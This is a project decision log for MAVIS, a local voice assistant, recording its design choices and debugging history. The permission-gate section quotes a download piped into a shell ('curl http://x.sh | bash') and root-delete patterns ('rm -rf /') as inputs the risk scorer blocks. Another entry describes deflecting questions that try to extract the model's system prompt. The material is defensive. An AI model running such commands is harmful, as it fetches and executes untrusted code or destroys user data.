# MAVIS — Decision Log

Every significant decision made while building MAVIS: what was decided, why, what else was considered, and every real problem hit along the way — what the symptom was, what the cause actually turned out to be, and how it was fixed.

`PHASES.md` says **what** exists. This file says **why it is the way it is**, so that nobody — including a future version of us — "tidies up" a decision without knowing the problem it solved.

---

## How to read this

Entries are grouped by area and dated. Two shapes:

- **Decisions** — *Context → Decision → Why → Alternatives rejected*
- **Problems** — *Symptom → Actual cause → Fix → Evidence*

The **Evidence** line matters most. It records whether a fix was *measured* on real hardware, *proven* by a test that fails against the old code, or only *reasoned* about. Those are not equally trustworthy, and this log says which one each entry is.

**Nothing here is deleted.** When a decision is reversed or a diagnosis turns out wrong, the entry stays and is marked **Retracted** or **Superseded**, with what replaced it. That is the same rule the audit log follows: a record that edits its own history is decoration.

### Contents

1. [Standing principles](#1-standing-principles)
2. [Timeline](#2-timeline)
3. [Architecture](#3-architecture)
4. [Voice pipeline](#4-voice-pipeline)
5. [Context awareness — Phase 6](#5-context-awareness--phase-6)
6. [Action execution — Phase 6.5](#6-action-execution--phase-65)
7. [Memory — Phase 7](#7-memory--phase-7)
8. [Safety & permissions — Phase 8](#8-safety--permissions--phase-8)
9. [Crash safety — the 2026-09-20 audit](#9-crash-safety--the-2026-09-20-audit)
10. [System Sentinel — Phase 8.5](#10-system-sentinel--phase-85)
11. [Orb UI](#11-orb-ui)
12. [Process, tooling and build](#12-process-tooling-and-build)
13. [Mistakes and retractions](#13-mistakes-and-retractions)
14. [Open issues](#14-open-issues)
15. [The 2026-09-22 live run](#15-the-2026-09-22-live-run)
16. [The 2026-09-26 live run and barge-in](#16-the-2026-09-26-live-run-and-barge-in)
17. [The 2026-09-27 run — MAVIS interrupting itself](#17-the-2026-09-27-run--mavis-interrupting-itself)
18. [Memory that follows you into the next session](#18-memory-that-follows-you-into-the-next-session)

---

## 1. Standing principles

These are the rules every decision below was measured against. When two entries seem to conflict, one of these usually explains which way it went.

**Deterministic beats the LLM wherever a mistake would be consequential.** The local model is a 3.8B Phi-3. It is good at conversation and unreliable at following format rules. So it is never put in charge of anything where being wrong has side effects: not action selection, not risk scoring, not memory importance, not severity. It may *phrase* things. It may *raise* a risk score as a second opinion. It may never lower one or decide one alone.

**Measure, don't guess.** Every audio threshold in the voice pipeline was derived from recorded traces on the target machine. Guessed values were tried first and each one failed — see §4.

**Verify before trusting a success message.** Several bugs in this log were "fixed" in code review and still broken on hardware. A fix is not done until it has been observed working, or until a test exists that fails against the old code.

**Fix the class, not the instance.** A bug found once usually has siblings. When a fix lands, search for the same pattern elsewhere. §9.1 is what happens when this isn't done.

**Opt-in for anything that reads the user.** Every context source is off by default. So is the Sentinel. Date and time are the only exception, because they are not private.

**Add a dependency only when it has earned its place.** FTS5 instead of an 80 MB embedding model plus FAISS. Heuristics instead of spaCy. A hand-rolled URL encoder instead of a crate. The crash-safety work added zero dependencies.

**Fail loud, degrade gracefully.** A missing microphone costs MAVIS its ears, not its life. A panicking subsystem is restarted and logged, not silently lost.

**"Always present. Never intrusive."** Every feature has to pass this. It is why the Sentinel stays silent on first run, groups changes into one sentence per update, and never speaks about routine upgrades.

---

## 2. Timeline

| Dates | Phase | What happened |
|---|---|---|
| 2026-08-01 → 08-06 | 1–2 | Rust runtime, event bus, orb, layered memory, executor, system integration |
| 08-07 → 08-10 | 3 | Rust↔Python bridge over UDS, local LLM, worker lifecycle and crash recovery |
| 08-11 → 08-26 | 4 | STT (faster-whisper), TTS (Piper), end-to-end voice loop |
| 08-26 → 09-02 | 5 | TTS queue and interruption, session recovery, echo fix, hallucination handling |
| 09-02 → 09-12 | 6 | Context awareness; VAD rebuilt from measured traces |
| 09-12 | 6.5 | Action execution; installed-app discovery |
| 09-13 → 09-15 | 7 | Recall, decay, consolidation, replay, entity graph |
| 09-16 | — | GNOME crash fixed, compositor detection hardened, orb made draggable |
| 09-17 → 09-18 | 8 | Risk scoring, permission gate, audit log, confirmation flow |
| 09-19 | — | Two lost fixes re-applied; graceful audio failure; dead memory stores removed |
| 09-20 | — | Full code audit; three UTF-8 panics, a deadlock and a poison cascade fixed; subsystem supervision |
| 09-20 → 09-21 | 8.5 | System Sentinel: package change detection |
| 09-22 | — | First live run after the audit: 60 s replies traced to the VAD, Whisper and the LLM; all three fixed (§15) |
| 09-26 | — | Second live run: 2 s replies, no hallucinations. Actions never fired and the model narrated them instead; barge-in built (§16) |
| 09-27 | — | Barge-in's first real run: MAVIS cut itself off on every reply. Echo measurement rebuilt, interruption made reversible (§17) |
| 09-30 | — | A fresh run answered "can you hear me" with last week's clipboard: conversation no longer survives a restart, old questions purged from recall (§18) |
| 10-06 | 8.5 | Sentinel steps 4 and 5: file integrity and advisories, checked against real `pacman`, `rpm`, `dpkg`, `arch-audit` and `debsecan` output; Windows and macOS inventories written but unverified. Phase 8.5 is built; nothing since step 2a has had a hardware run (§21, §22) |
| 10-01 | 8.5 | Sentinel step 3: users, groups, SSH keys, sudoers, enabled units and setuid binaries watched; gains are Critical or Notable. Tested; not yet run on hardware (§20) |
| 10-01 | 8.5 | Sentinel step 2b: pending changes spoken on the next utterance, "what changed?" and "what did that update do?" answered from the store. Built and tested; not yet heard on hardware (§19) |

---

## 3. Architecture

### ADR-001 · Single companion identity
**Decision:** MAVIS is one persistent companion, not a collection of assistants or modes. The orb is its identity; voice is only an interface. *(Carried over from the original design.)*

### ADR-002 · The planner decides, the executor acts
**Decision:** Separate modules. The planner never runs anything; the executor never decides anything.
**Why:** It is what made Phase 8 possible to add cleanly. Because plans already crossed a boundary as events, a permission gate could be inserted between the two without touching either. See ADR-007.

### ADR-003 · Rust owns the runtime, Python owns the AI
**Decision:** `mavis_core` (Rust, always on, ~50 MB) and `mavis_worker` (Python, spawned on demand, killed when idle).
**Why:** Model weights and CUDA belong in the Python ecosystem. Everything that has to be always-on and cheap — the orb, audio capture, window tracking, memory — belongs somewhere with no GC pauses and no interpreter startup. Idle cost stays near zero because the expensive half can be unloaded.

### ADR-004 · Keep the event bus
**Date:** mid-Phase 7, ~2026-09-14
**Context:** Partway through Phase 7 an alternative architecture diagram was considered — a more linear pipeline: STT → context engine → planner → permissions → executor, with the worker hanging off the side.
**Decision:** Keep the existing event-driven design (`tokio::sync::broadcast`, every subsystem publishes and subscribes).
**Why:** The bus is load-bearing, and the alternative's advantages were already available. The diagram's main idea — a permissions stage between planner and executor — was added in Phase 8 as a subscriber, with no restructuring. A pipeline would have made cross-cutting concerns (the orb watching everything, the context engine seeing every event, the mute controller reacting to TTS state) into explicit wiring instead of subscriptions.
**Alternatives rejected:** the linear pipeline above.

### ADR-005 · UDS with length-prefixed JSON for the Rust↔Python bridge
**Decision:** Unix domain socket at `/tmp/mavis_worker.sock`; each message is a 4-byte little-endian length followed by JSON.
**Why:** Local-only by construction — nothing to firewall, no port to collide with. Not stdin/stdout, because several Rust tasks (STT, warm-up, consolidation, TTS) each open their own connection. Not HTTP or gRPC: no benefit for a same-machine link, and real cost in dependencies.
**Known issue:** the socket is created with mode `0666` in a world-writable directory. See §14.

### ADR-006 · Deterministic intent matching before the LLM
**Date:** 2026-09-02 onward
**Decision:** The planner pattern-matches known intents — meta-questions, system control, app launching, searches — and only sends what it doesn't recognise to the model.
**Why:** Two reasons. Speed: a matched intent replies near-instantly instead of after a model round trip. Safety: an LLM choosing actions makes its mistakes consequential rather than merely wrong.
**Evidence:** The first use was prompt-leak deflection (§4). Rewording the system prompt failed — the model swapped "guiding principles" for "my guidance" and leaked anyway. Catching the *question* deterministically worked 3/3 on hardware, including against a mis-transcribed "Movis, do you have any system prompt?".

### ADR-007 · Static risk scoring; the LLM may only raise a score
**Date:** 2026-09-17
**Context:** The phase plan specified "second-pass LLM call rates risk 1–10".
**Decision:** Risk is scored by static rules in `safety/risk.rs`. An LLM pass may later *raise* a score as a second opinion. It must never lower one.
**Why:** A missed judgement here runs a destructive command, and the model in question has been unreliable at following simple format rules. Static rules are auditable, deterministic, and cannot be talked around.

### ADR-008 · Every context source is opt-in
**Date:** 2026-09-02
**Decision:** `MAVIS_CONTEXT_ACTIVE_WINDOW`, `_CLIPBOARD`, `_CALENDAR`, `_BROWSER` — all default off. The Sentinel follows the same rule with `MAVIS_SENTINEL`.
**Why:** Privacy-first means the user decides what MAVIS may see, per source. Date and time are always injected because they aren't private, and without them the model guesses wrong about anything time-related.

### ADR-009 · Supervise every event-loop subsystem
**Date:** 2026-09-20 · see §9.2 for the bug that forced it
**Decision:** The context engine, planner, permission gate, executor, context poller and Sentinel all run under `util::supervise`. A panic is logged loudly and the subsystem is rebuilt from its `Arc` handles and restarted — up to 5 times with a 500 ms backoff, then it gives up and says so.
**Why:** A panic inside a `tokio::spawn`ed task ends only that task. The process keeps running, the orb keeps animating, and the subsystem is simply gone — with nothing logged at the application level. That exact failure made MAVIS stop answering mid-session.
**Alternatives rejected:** `catch_unwind` around each event, which would have needed the `futures` crate. Supervision needs only `tokio` and rebuilds a fresh, consistent object instead of resuming from half-updated state.

### ADR-010 · The Sentinel reports facts, never malware verdicts
**Date:** 2026-09-20 · see §10
**Decision:** MAVIS reports what changed on the machine and leaves the judgement to the user. It never classifies anything as malware. Where a real scanner exists — Defender, ClamAV, XProtect — its findings are reported *as that tool's findings*.
**Why:** Any heuristic MAVIS could write would pattern-match on names and paths. It would flag ordinary packages, miss anything designed to evade, and — worst — imply an all-clear it has no basis for. "MAVIS says I'm clean" is more dangerous than no opinion.

---

## 4. Voice pipeline

### Problem · Microphone silently routed to nothing
**Date:** 2026-08-15
**Symptom:** STT received silence.
**Cause:** cpal's `default` device resolved to a route with no signal on this hardware.
**Fix:** Explicit device scoring in `stt.rs`, preferring `front`/`sysdefault` of the generic card; `MAVIS_AUDIO_DEVICE` overrides by exact name.
**Evidence:** Measured.

### Problem · Silence could never be detected
**Date:** 2026-09-05 → 09-07
**Symptom:** Utterances never ended naturally — they only stopped at the hard time ceiling.
**Actual cause:** The adaptive threshold was capped at 0.022, but measured silence on this machine sits at **median 0.033, peak 0.058**. The cap was *below the noise floor*, so every frame read as speech.
**Fix:** Thresholds re-derived from `arecord` traces of real silence and real speech on the target machine.
**Evidence:** Measured.

### Decision · Hysteresis: start at 0.075, end at 0.06
**Date:** 2026-09-07
**Context:** A single threshold could not do both jobs. High enough to reject false starts meant cutting sentences at quiet syllables; low enough to survive those meant ambient noise read as speech.
**Decision:** Two thresholds. It takes 0.075 to *start* (above the 0.058 silence peak, with margin) and only a drop below 0.06 to count as silence *once speaking*.
**Why these numbers:** An earlier start value of 0.10 came from a speech median skewed by loud syllables and never triggered on real speech at all. Noise-floor multipliers were lowered at the same time (2.0× → 1.4× for start, 1.2× → 1.15× for end) because at 2.0× the adapting floor pushed the threshold above normal speaking volume and the VAD stopped triggering entirely.
**Evidence:** Measured.
**Partly superseded 2026-09-22:** 0.075 and 0.06 remain, as *minimums*. On top of them the thresholds now follow the measured room, because fixed values failed as soon as the room was louder than the one they were measured in. See §15.

### Decision · Silence wait of 500 ms — not 400
**Date:** 2026-09-12
**Context:** The pause MAVIS waits for before deciding you've finished is dead time on every single exchange. It was 600 ms.
**Decision:** 500 ms.
**Why not lower:** The longest sub-threshold dip measured *inside real speech* was **450 ms**. Anything at or below that splits sentences mid-thought. 400 ms was written first and immediately corrected — it would have reintroduced mid-sentence cutting. Going lower requires raising the end threshold first.
**Evidence:** Measured.

### Problem · MAVIS transcribed a speech nobody gave
**Date:** 2026-09-12
**Symptom:** With nobody speaking, MAVIS transcribed *"Hello everyone! Today we are going to talk about how we can help people with disabilities…"*
**Actual cause:** Opening the audio input stream emits a full-scale click — measured `max_energy=1.000` about a second after startup. The VAD shipped it as a ~1.3 s "utterance", and Whisper, trained to always produce fluent speech, invented a sentence.
**Fix:** Ignore all audio for 1.5 s after the stream opens (`STREAM_SETTLE_TIME`), and drop any utterance shorter than 1.5 s (`MIN_UTTERANCE_SAMPLES = 24000`).
**Evidence:** Measured; did not recur.

### Problem · Whisper hallucinates confidently on near-silence
**Date:** 2026-09-02
**Symptom:** "Thank you for watching", "I don't know what I'm talking about" — on quiet rooms.
**Why the confidence gate didn't catch it:** Whisper reports these with *high* confidence. It's trained on subtitle data, where such phrases really do follow silence.
**Fix:** `HALLUCINATION_DENYLIST` in `stt/engine.py`, matched after whitespace and curly-apostrophe normalisation — segment joins and `’` were breaking exact comparison on the first attempt.
**Evidence:** Measured.
**Superseded 2026-09-22:** the list is gone; Whisper now only hears audio a speech detector has marked as speech (§15).

### Decision · Confidence threshold 0.6 → 0.45
**Date:** 2026-09-12
**Why:** Correct transcriptions were being silently dropped at 0.590 and 0.499. Dropped text is now also logged, so borderline rejections are debuggable rather than silent.
**Evidence:** Measured.

### Decision · Bias Whisper toward the vocabulary MAVIS actually hears
**Date:** 2026-09-02, expanded 2026-09-16
**Context:** "MAVIS" was heard as baby, movies, moose, Ladies and Clayport. "Clipboard" came out as "clayboard".
**Decision:** `initial_prompt` listing the real words: MAVIS, clipboard, workspace, terminal, niri, GNOME, Firefox, and so on.
**Why:** On a weak signal Whisper leans on its language model and picks the commoner near-homophone. Naming the rare words makes them likelier. Measurable improvement — 4/6 correct in one session — not a complete fix, which is expected from a quantized small model on an uncommon name.

### Problem · MAVIS heard its own voice as the user
**Date:** 2026-09-02
**Symptom:** MAVIS's TTS output came back as new "user" speech. It also fed a run of bogus name extractions.
**Actual cause:** The echo-suppression logic in `stt.rs` checked a `tts_active` flag — but it was a *different* `AtomicBool` from the one the executor set. Two flags, never connected. The code looked right in review.
**Fix:** One shared flag passed into `SttManager::start()`.
**Evidence:** Measured. This is the entry behind the principle "verify before trusting a success message" — the 2026-08-29 version of this fix had been declared done.

### Problem · The latency diagnosis that was wrong
**Date:** 2026-09-12 · **Retracted diagnosis**
**What was claimed:** that TTS playback was fire-and-forget, so the microphone reopened while MAVIS was still speaking.
**What was true:** the executor does `child.wait()` inside a `tokio::select!`. The claim was made without reading `executor.rs`, and was wrong. `PHASES.md` §6.2 was corrected to say so.
**Measured result:** 9 of 12 replies within 1–2 s of the end of speech; no speech detected during any playback.

### Problem · Zero speech detected for a whole session
**Date:** 2026-09-19; cause found 2026-09-20
**Symptom:** MAVIS heard nothing at all.
**Actual cause:** The microphone's capture gain was at **0.35**. At that level normal speech peaks around 0.03–0.05, below the 0.075 start threshold. Not a MAVIS bug.
**Fix:** `wpctl set-volume @DEFAULT_AUDIO_SOURCE@ 0.6`. Thresholds deliberately left alone — they are calibrated against measured room noise, and lowering them to compensate for a quiet mic would reopen the hallucination problem.
**Superseded 2026-09-22:** 0.6 was a guess, not a measurement, and it was too hot — with fans running, the room alone sat above the end threshold and MAVIS never heard the user stop (§15). The real fault was that the thresholds couldn't follow the room at all; that is what changed.

### Decision · Keep `MAVIS_VAD_DEBUG`
**Date:** `VAD-LIVE` logging removed 2026-09-14; restored as the opt-in `MAVIS_VAD_DEBUG` 2026-09-19
**Why it came back:** The unconditional `VAD-LIVE` energy logging was removed once the thresholds were tuned. Then a whole debugging session was spent on "MAVIS doesn't respond" that turned out to be the quiet microphone above — and it was the one diagnostic that distinguishes a MAVIS bug from a muted mic. It stays, off by default.

### Problem · STT start panicked when there was no microphone
**Date:** 2026-09-19
**Symptom:** Missing or busy mic took down the entire process — memory, context and the orb along with it.
**Cause:** Six `.expect()` calls and a `panic!` in `SttManager::start()`.
**Fix:** Returns `anyhow::Result`. `main.rs` falls back to dead channels and MAVIS runs without ears, saying so plainly.

---

## 5. Context awareness — Phase 6

### Problem · MAVIS crashed a GNOME session
**Date:** 2026-09-16
**Symptom:** Running MAVIS on GNOME brought the desktop down.
**Actual cause:** Project detection walks the focused window's process tree. The old `collect_children` **rescanned all of `/proc` for each descendant** — at depth 3 with a few hundred processes, that was over a hundred full directory walks and tens of thousands of file reads, every 2 seconds. Survivable on niri. Not on GNOME, which runs far more processes.
**Fix:** One pass over `/proc` builds a parent→children map (`build_process_tree`); the tree is then walked in memory, bounded at depth 3 and 64 nodes. Results are cached per PID for 30 s, including negatives.
**Evidence:** Reasoned plus verified in code; **not yet re-run on a real GNOME session.** See §14.

### Problem · A dozen doomed process spawns every 2 seconds
**Date:** 2026-09-16
**Cause:** Every context poll tried `niri`, then `swaymsg`, then `hyprctl`, then up to three `xdotool` calls — most of which fail on any given desktop.
**Fix:** `enum Compositor`, resolved **once** at startup.

### Problem · GNOME detected as niri
**Date:** 2026-09-16
**Symptom:** On GNOME, the log said `using Niri`, and every poll then failed forever.
**Actual cause:** `NIRI_SOCKET` had leaked into the GNOME login from a previous session. MAVIS trusted the environment variable.
**Fix:** Environment variables now only decide the *order* to try things in. Each candidate is confirmed by actually running it and checking the output parses.
**Lesson:** Environment variables are hints, not proof.

### Problem · A failed command looked like success
**Date:** 2026-09-16
**Cause:** `run_cmd` returned `Some("")` when a command existed but errored — niri outside a niri session, say — and every caller read that as success.
**Fix:** Checks exit status and rejects empty output.

### Problem · MAVIS reported its own launch command as "what the user is doing"
**Date:** 2026-09-10
**Cause:** Terminals set their title to the running command. MAVIS's command was a wall of `MAVIS_CONTEXT_*=1` assignments.
**Fix:** `strip_env_prefix` removes leading uppercase `VAR=value` tokens, so the title reads `cargo run`.

### Problem · "The user's name is Sorry"
**Date:** 2026-08-28 → 09-02
**Cause:** Name extraction matched patterns like "I'm ___". An offset bug came first; then false positives kept arriving — Not, In, Looking, Mavis, Sorry — mostly downstream of the echo bug in §4 feeding MAVIS's own speech back in.
**Fix:** Offset fixed; `NAME_DENYLIST` extended. Most of this class disappeared once echo was fixed.
**Superseded 2026-09-22:** the denylist approach lost to "I'm using…" → "Using". The "I'm" / "I am" patterns are gone; see §15.

### Problem · First UTF-8 panic
**Date:** 2026-09-02
**Cause:** `extract_user_name` computed a byte offset in the lowercased string and used it to slice the original. Lowercasing can change a string's byte length (Turkish İ), so the offset could land mid-character.
**Fix:** Slice the lowercased string consistently.
**Lesson, learned late:** this was fixed as an instance. Three more members of the same class survived until 2026-09-20 — see §9.1.

### Decision · Browser awareness dropped
**Date:** 2026-09-04
**Why:** Reading real tab URLs needs a browser extension plus a native-messaging host. Shipping a browser extension as part of MAVIS was judged not worth it. The receiving end (`BrowserUpdate`, `/tmp/mavis_browser.sock`) is kept, so a future non-extension source could feed it.

### Decision · Calendar via Evolution's local `.ics`; recurring events skipped
**Why:** Local file, no account access. `RRULE` expansion is a sizeable problem on its own and was skipped by design.
**Status:** The parser is verified against the real file format, but the *has-events* path is untested because the local calendar is empty. See §14.

---

## 6. Action execution — Phase 6.5

### Problem · Nothing MAVIS could do was reachable
**Date:** 2026-09-12
**Cause:** `executor.rs` implemented `shell`, `app`, `notify` and `system`, but the planner only ever emitted `say`.
**Fix:** Deterministic action intents in the planner (ADR-006), each emitting a `say` plus the action so there is spoken confirmation.

### Decision · Discover installed apps instead of hardcoding them
**Date:** 2026-09-12
**Context:** The first version had a fixed alias list. The obvious question was asked: what happens when Firefox and Brave are removed for LibreWolf, Zen or Helium?
**Decision:** Discover what's actually installed — `.desktop` files on Linux, Start Menu `.lnk` on Windows, `.app` bundles on macOS — behind `PlatformProvider::installed_apps()`.
**Matching:** Deliberately loose for speech — "code" finds Code - OSS, "notepad" finds DMS Notepad — and returns nothing rather than guessing a binary that doesn't exist, so "open my heart" falls through to the LLM instead of failing to spawn.
**Evidence:** 104 apps discovered on Linux. **Windows and macOS are untested** and marked so in the source.

### Problem · "google how to mute a tab" muted the machine
**Date:** 2026-09-15
**Cause:** System-intent matching found "mute" inside the sentence.
**Fix:** `OVERRIDING_PREFIXES` — an utterance that opens with an explicit action (`google `, `search for `, `open `, `play `…) is never a system command. Phrases are also matched whole, so "what's the volume policy at work" isn't a volume command.
**Evidence:** Caught by testing the patterns before shipping; now a permanent regression test.

### Decision · `shell` is unreachable from voice
**Decision:** There is no path from speech to the executor's `sh -c`.
**Why:** An unrestricted shell driven by speech transcription was the hole the first audit flagged. Phase 8 now scores and gates shell commands, but the planner still never produces them. That remains true until there is a reason to change it.

### Problem · XDG application directories were ignored
**Date:** written during the cross-desktop work; never committed; re-applied 2026-09-19
**Cause:** Discovery searched hardcoded paths only, missing `XDG_DATA_DIRS` / `XDG_DATA_HOME` — which is where Nix, Snap and several distros put `.desktop` files.
**Fix:** Search XDG paths *in addition to* the defaults, deduplicated by `.desktop` file stem.
**Note:** This fix was written, never committed, and silently lost. See §13.

---

## 7. Memory — Phase 7

### Decision · SQLite FTS5 instead of vector embeddings
**Date:** 2026-09-13
**Context:** The plan called for `sentence-transformers` (~80 MB model) plus FAISS.
**Decision:** SQLite's built-in FTS5.
**Why:** That's three new dependencies and a model download for a project whose rule is to add only what's necessary. Full-text search covers much of the same ground: "audio" finds a memory about "VAD thresholds"; "text to speech engine" finds "piper over kokoro".
**Revisit when:** recall proves too literal in real use. Then embeddings become a decision backed by evidence rather than an assumption.

### Decision · No spaCy for the entity graph
**Date:** 2026-09-15
**Why:** A heavy dependency plus a language model, and poor at exactly the entities that matter here — it won't tag `mavis_core` as a project or `stt.rs` as a file. Entities come from things the context layer already knows with certainty: git repo names, compositor app IDs, filenames from IDE titles. They are observations, not predictions, so nothing can be misidentified.
**Known cost:** people mentioned in conversation ("meeting with Sarah") are not captured. That is what spaCy would have added.

### Decision · Heuristic importance scoring, not an LLM call
**Why:** The model is already the latency bottleneck; scoring every utterance would add a round trip to every exchange. Stated facts ("my name is", "I prefer") score 9, questions 3, three-word commands 1 and are not stored.

### Decision · Retention scales with importance
**Decision:** MAVIS's own replies 7 days, questions 30, statements 90, stated facts forever.
**Why:** A flat 30 days would either forget the user's name or keep every passing question indefinitely.

### Decision · Hourly consolidation, not a 3 am cron
**Why:** MAVIS isn't guaranteed to be running at any particular time. "Check whether yesterday still needs summarising" is more robust than "fire at 3 am". Looks back 7 days; skips already-summarised days without an LLM call, and days with fewer than 3 meaningful memories.

### Decision · Episodic replay recognises a small fixed set of phrases
**Decision:** `yesterday`, `today`, `this/yesterday morning|afternoon|evening`, `last week`, `this week` — not general date parsing.
**Why:** A wrong time window is worse than none: it would inject unrelated history into the prompt as though it were relevant.

### Problem · MAVIS started believing its own guesses
**Date:** observed 2026-09-16
**Symptom:** Answers drifted toward things MAVIS had previously speculated.
**Actual cause:** Recall returned MAVIS's own replies alongside the user's words. **10 of 17 recalled entries were MAVIS quoting itself**, one carrying the "clayboard" mistranscription forward as fact. A vague guess was recorded, recalled, treated as established, and produced more of the same.
**Fix:** Recall filters to `role = 'user'`. MAVIS's replies are still stored — replay and consolidation need them — but they are never fed back as memory.
**Note:** Written, never committed, silently lost, re-applied 2026-09-19. See §13.

### Problem · Polling evicted the conversation
**Symptom:** MAVIS forgot what had just been said.
**Cause:** `ContextUpdate` arrives every 2 seconds. It was going into the 50-slot working-memory ring, filling it in about two minutes and pushing the actual conversation out.
**Fix:** Only conversational events enter the ring: `UserIntent`, `WorkerResponse`, `PlanReady`, `ActionComplete`, `SystemWake`. Context lives in dedicated fields instead.
**Carried forward:** this is also why `SystemChange` (§10) is deliberately kept out of the ring.

### Decision · Record entities only when the combination changes
**Why:** Context updates arrive every 2 s. Recording each one would measure idle time rather than work.

### Decision · Defer routine detection (7.3)
**Why:** Routine detection needs months of accumulated behaviour to find anything real. With days of data, a pattern detector produces confident nonsense. The entity graph is exactly the data that will eventually feed it.

### Decision · Remove `PermanentStore` and `SessionStore`
**Date:** 2026-09-19
**Why:** Both were Phase 1 stubs that nothing read. `PermanentStore`'s job was taken over by recall (stated facts never decay) and the entity graph. The compiler confirmed it: `field 'permanent' is never read`.

---

## 8. Safety & permissions — Phase 8

### Decision · Risk bands instead of five named tiers
**Date:** 2026-09-17
**Context:** The plan specified five tiers — Read, Notify, Ask, Execute, Administrator.
**Decision:** A 0–10 score, and three behaviours: **0–2** run silently, **3–7** ask "Shall I?", **8+** require the word "administrator". Irreversible patterns are refused outright at any score.
**Why:** A score composes: one dangerous step makes the whole plan dangerous, and `assess_plan` takes the worst. Named tiers are still the right model for per-skill permissions, which wait on Phase 9.
**Departures from plan:** the plan contradicted itself — §8.2 said confirm at risk ≥ 5, §8.3 said ask from 3. It was built to the stricter one, asking from 3. The answer window is 20 s rather than the planned 5, which was too short to hear a spoken question and answer it.

### Problem · The deny-list blocked a legitimate command
**Date:** 2026-09-17, before the first safety commit
**Symptom:** `sudo rm -rf /home/azazel/Projects` was refused outright.
**Cause:** `"rm -rf /"` was a substring match, and it's a prefix of every absolute path.
**Fix:** `is_root_delete` inspects what *follows* the slash — nothing, whitespace, `;`, `&`, `|` or `*` means the target really is `/`. Deleting a project directory is now confirmable at risk 9, not blocked.
**Evidence:** Caught by testing the patterns before they were committed — the first committed `risk.rs` already has the fix, so the false refusal never shipped.

### Problem · Piping a download into a shell slipped through
**Date:** 2026-09-17
**Symptom:** `curl http://x.sh | bash` scored only 4.
**Cause:** The pattern was the literal `"curl | bash"`. The URL sits in between, so it never matched.
**Fix:** `is_pipe_to_shell` checks for a download command *and* a shell pipe anywhere in the command.
**Evidence:** Caught by testing before shipping.

### Decision · High-risk actions need the word "administrator"
**Why:** A bare "yes" is too easy to say by accident, and too easy for a mistranscription to produce.

### Decision · Negation always wins
**Why:** "No, yes", "actually no, cancel that", "don't" — all refusals. When the cost of a false positive is running something destructive, ambiguity means no. Punctuation is normalised first, so "yes, administrator" works.
**Known weakness:** "ok" counts as agreement, so "okay so what about…" reads as consent for a risk 3–7 action. See §14.

### Decision · The audit log is append-only by construction
**Why:** An audit log that can be edited by the thing it audits is decoration. `AuditLog` exposes no update or delete method at all — not by convention, by absence.

### Problem · The audit log misreported its own outcomes
**Date:** found and fixed 2026-09-20
**Symptom:** Held actions were logged as `blocked_pending_confirmation`.
**Cause:** A comment from before the confirmation flow existed claimed actions needing confirmation were refused. The flow was then built directly below it, and a held action can go on to run — but the label never changed.
**Fix:** `held_for_confirmation`, closed by a second entry: `confirmed`, `declined` or `expired`.
**Why it mattered:** an append-only log that misreports what happened is worse than no log.

### Not built from the Phase 8 plan
- **Rollback** (`.mavis-backup/` snapshots) — not built.
- **Per-skill permissions** — blocked on Phase 9, which doesn't exist yet.
- **LLM second-pass risk** — replaced by static scoring (ADR-007).

---

## 9. Crash safety — the 2026-09-20 audit

A full audit of every line, run against a clone of the repository. Every claimed bug was **reproduced by compiling and running it**, not asserted from reading.

### 9.1 · Problem · Three UTF-8 panics — the likely cause of "it doesn't respond"
**Symptom:** Across several sessions, MAVIS would stop answering. Restarting fixed it. *"It didn't work the first time. Then I ran it again, it worked."*
**Actual cause:** Three places sliced strings by **byte** index:

| Where | Code | Input |
|---|---|---|
| `planner.rs` `strip_address` | `t[..prefix.len()]` | every transcription |
| `context_engine.rs` | `s[..s.len().min(20)]` | clipboard contents |
| `safety/mod.rs` `summarise` | `&what[..what.len().min(120)]` | spoken text |

Rust panics if that byte falls inside a multi-byte character. Whisper emits them routinely — curly apostrophes (the STT engine already normalises `U+2019`), em-dashes, `é` — and the clipboard can contain anything. Proven:
```
strip_address("ééé mavis open firefox") → PANIC: byte index 5 is inside 'é' (bytes 4..6)
```
**Why it looked like "doesn't respond" rather than a crash:** see 9.2.
**Fix:** `util::truncate_bytes` backs off to the nearest character boundary; `strip_address` uses `str::get(..n)`, where a non-boundary correctly means "doesn't match".
**Evidence:** **Proven** during the audit. An end-to-end test published the bad transcription *then* an ordinary command, and asserted a plan still came out. Against the old planner it failed — `byte index 5 is not a char boundary`, and the follow-up command was never answered. Against the new one it passed. That test isn't in the repository (see §12); the unit tests for each fix are, including 14 in `planner.rs` covering non-ASCII input.
**Lesson:** the same class of bug was fixed once before, on 2026-09-02 (§5), as a single instance. Nobody searched for siblings. On 2026-09-20 a single `grep` for byte-slice patterns found all three.

### 9.2 · Problem · A panic silently amputated a subsystem
**Actual cause:** A panic in a `tokio::spawn`ed task ends only that task. `if let Err(e) = handle_event(...)` catches errors, not panics. So the planner's task quietly completed, the process kept running, and nothing logged it. MAVIS still listened, still transcribed, still animated the orb — and nobody was left to plan.
**Fix:** ADR-009 supervision.
**Evidence:** Proven. Four tests: restarts after a panic, gives up after 5, does not restart a clean exit, does not restart during shutdown.

### 9.3 · Problem · One panic could take down the whole process
**Cause:** `EventBus::publish` did `self.sender.lock().unwrap()`. If any thread panicked while holding that lock — including the cpal audio callback thread, which publishes from outside tokio — the mutex was poisoned, and **every subsequent publish in the process panicked**. `subscribe()` also used `.expect("EventBus already closed")`.
**Fix:** Recover the guard from poison; after close, `subscribe()` returns an already-closed receiver so callers take their normal shutdown path. Adds `is_open()`.
**Evidence:** Proven. A test spawns a thread that panics while holding the lock, then asserts the bus still works.

### 9.4 · Problem · A deadlock in the audio thread
**Cause:**
```rust
if let Ok(mut g) = vad.lock() { g.reset(); }
else if let Err(p) = vad.lock() { p.into_inner().reset(); }
```
The crate is edition 2021, where an `if let` scrutinee temporary lives until the end of the *whole* if/else chain. In the `Err` arm, the first lock's `PoisonError` — which owns the guard — was still alive when the second `lock()` ran. `std::sync::Mutex` is not reentrant.
**Fix:** The `match` form, which the same file already used twelve lines below.
**Evidence:** Reasoned from the language rules. Only reachable after a poisoning, so not observed in practice.

### Decision · No new dependencies, no new language features
**Why:** The fixes had to keep MAVIS building everywhere it already built. Nothing added to `Cargo.toml`; `is_char_boundary` and `str::get` date from Rust 1.9 and 1.20.

### Decision · Supervision covers the context poller too
**Why:** The poller parses niri, sway, Hyprland and X11 output, and those formats drift between versions and distributions. On an older distribution's sway, a parse panic used to remove context awareness for the rest of the session.

---

## 10. System Sentinel — Phase 8.5

### Context · Why this exists
A `pacman -Syu` pulled in **Hyprland** as a dependency of a DMS shell update, on a machine that runs niri. It took days to notice. Hyprland wasn't the problem — but if it had been something corrupted, or something that compromised privacy, the delay would have mattered. This is a problem of **awareness**, not detection.

### Decision · Phase 8.5, alongside safety
